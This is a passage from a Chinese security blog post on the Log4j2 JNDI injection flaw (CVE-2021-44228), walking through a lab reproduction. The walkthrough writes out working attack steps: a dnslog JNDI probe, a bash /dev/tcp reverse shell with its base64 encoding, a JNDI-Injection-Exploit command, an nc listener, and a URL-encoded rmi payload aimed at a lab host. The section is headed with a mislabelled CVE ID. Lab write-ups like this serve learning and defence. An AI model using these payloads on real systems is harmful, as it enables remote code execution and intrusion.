logger.error(<span class="string">"errorinfo: {}!"</span>,username);</span><br><span class="line">	}	</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="6-2-漏洞复现过程"><a href="#6-2-漏洞复现过程" class="headerlink" title="6.2 漏洞复现过程"></a>6.2 漏洞复现过程</h4><h5 id="CVE-2021-12-09"><a href="#CVE-2021-12-09" class="headerlink" title="CVE-2021-12-09"></a>CVE-2021-12-09</h5><p>初始页面：</p>
+<p><img src="https://pic1.imgdb.cn/item/6817449358cb8da5c8dc085b.png"></p>
+<p>点击?????，出现URL参数</p>
+<p><img src="https://pic1.imgdb.cn/item/681744cf58cb8da5c8dc0b4e.png"></p>
+<p>可以在payload处进行操作，因为此靶场存在一些过滤，所以payload内容需要进行URL编码之后才能执行。</p>
+<p>先使用dnslog外带，来验证漏洞的存在</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=${jndi:ldap://${sys:java.version}.rpg11t.dnslog.cn}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果网页在转圈，说明正在执行，运行一段时间后，回显OK</p>
+<p><img src="https://pic1.imgdb.cn/item/6817472558cb8da5c8dc119a.png"></p>
+<p>查看DNSLOG，显示版本号</p>
+<p><img src="https://pic1.imgdb.cn/item/6817475b58cb8da5c8dc11ae.png"></p>
+<p>利用JNDI注入反弹shell：</p>
+<ol>
+<li>准备反弹shell，并将此命令进行Base64编码</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.116.75/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNi43NS80NDQ0IDA+JjE=</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>使用JNDIExploit进行漏洞利用，将上述Base64编码结果 填入指定位置</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c</span><br><span class="line">{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNi43NS80NDQ0IDA+JjE=}	|</span><br><span class="line">{base64,-d}|{bash,-i}" -A "192.168.116.75"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/6817638958cb8da5c8dc5641.png"></p>
+<ol start="3">
+<li>在攻击机开启监听</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="4">
+<li>选择漏洞利用工具生成的JDK下的URL，修改网页的payload中信息</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi://192.168.116.75:1099/sshowl</span><br></pre></td></tr></tbody></table></figure>
+
+<p>修改payload，该靶场还需对payload的值进行URL编码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.67/hello?payload=${jndi:rmi://192.168.116.75:1099/sshowl}</span><br><span class="line"></span><br><span class="line">URL编码后：http://192.168.116.67/hello?payload=%24%7Bjndi%3Armi%3A%2F%2F192.168.116.75%3A1099%2Fsshowl%7D</span><br></pre></td></tr></tbody></table></figure>
+
+<p>反弹shell成功。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/en/tags/JAVA%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" rel="tag">JAVA框架漏洞</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="Vite CVE-2025-30208" class="lazyload">
+          
+        
+        <a href="/en/2025/04/15/vite-cve-2025-30208/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            Vite CVE-2025-30208
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="Shiro漏洞" class="lazyload">
+        
+      
+      <a href="/en/2025/04/10/shiro-lou-dong/"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          Shiro漏洞
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2024-2025
+      
+      <span class="footer-info-sep "></span>
+      mX1@0
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        203.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        12:28
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Log4j2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">Log4j2漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">1 漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.2.</span> <span class="toc-text">2 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI%EF%BC%88%E4%BD%BF%E7%94%A8%E5%90%8D%E7%A7%B0%E6%9D%A5%E8%AE%BF%E9%97%AE%E5%AF%B9%E8%B1%A1%EF%BC%89"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">JNDI（使用名称来访问对象）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP%EF%BC%88%E8%BD%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">LDAP（轻型目录访问协议）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">RMI（远程方法调用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">触发过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.0.3.</span> <span class="toc-text">3 漏洞影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.4.</span> <span class="toc-text">4 漏洞利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.0.5.</span> <span class="toc-text">5 防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.6.</span> <span class="toc-text">6 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E8%BF%87%E7%A8%8B%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.0.6.1.</span> <span class="toc-text">6.1 漏洞产生过程模拟</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.6.2.</span> <span class="toc-text">6.2 漏洞复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-12-09"><span class="toc-number">1.0.6.2.1.</span> <span class="toc-text">CVE-2021-12-09</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/%E5%9B%BE1.jpg" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="链接"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">链接</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "mX1@0",
+          title: "Log4j2漏洞",
+          url: "http://example.com/2025/04/10/log4j2-lou-dong/",
+          excerpt: "",
+          description: "",
+          stripContent: "Log4j2漏洞​  Log4j2漏洞，特别是CVE-2021-44228，是一个严重的安全漏洞，它允许攻击者通过构造特定的输入，利用**Java命名和目录接口（JNDI）执行远程代码**。以下是对该漏洞的详细解析： 1 漏洞简介​  Apache Log4j2是一个基于Java的日志记录工具，被广泛应用于业务系统开发中。它允许开发者将程序的输入输出信息进行日志记录，并可以控制日志信息输送的目的地，如控制台、文件、GUI组件等。然而，在2021年12月，Apache官方披露了Log4j2的一个远",
+          date: "Thu Apr 10 2025 23:41:03 GMT+0800",
+          updated: "Sun May 04 2025 21:25:34 GMT+0800",
+          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
